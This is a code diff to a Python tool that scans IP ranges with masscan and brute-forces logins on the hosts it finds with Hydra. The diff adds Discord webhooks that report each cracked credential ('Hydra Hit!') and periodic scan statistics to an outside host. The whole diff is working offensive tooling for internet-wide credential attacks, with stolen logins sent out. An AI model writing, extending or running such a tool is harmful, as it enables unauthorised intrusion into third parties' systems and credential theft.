@@ -5,6 +5,10 @@ import subprocess
 import time
 import ipaddress
 import json
+import requests
+
+DISCORD_STATS_WEBHOOK_URL = "https://discord.com/api/webhooks/your_stats_webhook_here"
+DISCORD_HIT_WEBHOOK_URL = "https://discord.com/api/webhooks/your_hit_webhook_here"
 
 UFILE = "users.txt"
 PFILE = "passes.txt"
@@ -25,6 +29,48 @@ q = queue.Queue()
 stats = {"scanned_ips": 0, "hits": 0, "fails": 0, "errors": 0}
 active_hydra = 0
 hydra_lock = threading.Lock()
+current_range = "N/A"
+
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
+
+def send_discord_stats():
+    embed = {
+        "title": "Scan Stats Update",
+        "color": 7506394,
+        "fields": [
+            {"name": "Scanned IPs", "value": str(stats['scanned_ips']), "inline": True},
+            {"name": "Hits", "value": str(stats['hits']), "inline": True},
+            {"name": "Fails", "value": str(stats['fails']), "inline": True},
+            {"name": "Errors", "value": str(stats['errors']), "inline": True},
+            {"name": "Active Hydra", "value": str(active_hydra), "inline": True},
+            {"name": "Queue Length", "value": str(q.qsize()), "inline": True},
+            {"name": "Current Range", "value": current_range, "inline": False}
+        ]
+    }
+    data = {"embeds": [embed]}
+    try:
+        requests.post(DISCORD_STATS_WEBHOOK_URL, json=data)
+    except Exception as e:
+        print("Discord stats webhook error:", e)
+
+def send_discord_hit(hit_info):
+    embed = {
+        "title": "Hydra Hit!",
+        "description": hit_info,
+        "color": 15158332,
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+    }
+    data = {"embeds": [embed]}
+    try:
+        requests.post(DISCORD_HIT_WEBHOOK_URL, json=data)
+    except Exception as e:
+        print("Discord hit webhook error:", e)
+
+def discord_stats_periodic():
+    while True:
+        time.sleep(10800)  # 3 Stunden warten
+        send_discord_stats()
 
 def get_last_scanned_ip():
     if os.path.exists(CHECKPOINT_FILE):
@@ -77,6 +123,7 @@ def brute(ip):
             # Debug: Uncomment to see successful hits
             # print(f"[DEBUG] Hydra success: {line}")
             save_hit(line)
+            send_discord_hit(line)
             found = True
         elif "error" in line.lower():
             save_err(line)
@@ -97,9 +144,11 @@ def worker():
         q.task_done()
 
 def scan():
+    global current_range
     current_ip = get_last_scanned_ip()
     while current_ip <= end_ip:
         next_ip = min(current_ip + BATCH - 1, end_ip)
+        current_range = f"{current_ip} - {next_ip}"
         cmd = (
             f"masscan -p {PORT} --open --rate={RATE} --wait 0 "
             f"--range {str(current_ip)}-{str(next_ip)} "
@@ -136,8 +185,8 @@ def start_workers():
 
 def show_stats():
     while True:
-        time.sleep(1)
-        os.system("cls")
+        time.sleep(5)
+        clear_screen()
         print("=== Stats ===")
         print(f"Scanned IPs: {stats['scanned_ips']}")
         print(f"Hits: {stats['hits']}")
@@ -147,9 +196,8 @@ def show_stats():
             current_active_hydra = active_hydra
         print(f"Active Hydra: {current_active_hydra}")
         print(f"Queue Length: {q.qsize()}")
+        print(f"Current Range: {current_range}")
         print("==============")
-        # Debug: Uncomment to see current checkpoint value
-        # print(f"[DEBUG] Last checkpoint: {get_last_scanned_ip()}")
 
 def run():
     # Debug: Uncomment to indicate workers are starting
@@ -157,6 +205,7 @@ def run():
     start_workers()
     threading.Thread(target=scan, daemon=True).start()
     threading.Thread(target=show_stats, daemon=True).start()
+    threading.Thread(target=discord_stats_periodic, daemon=True).start()
     while True:
         time.sleep(1)
 
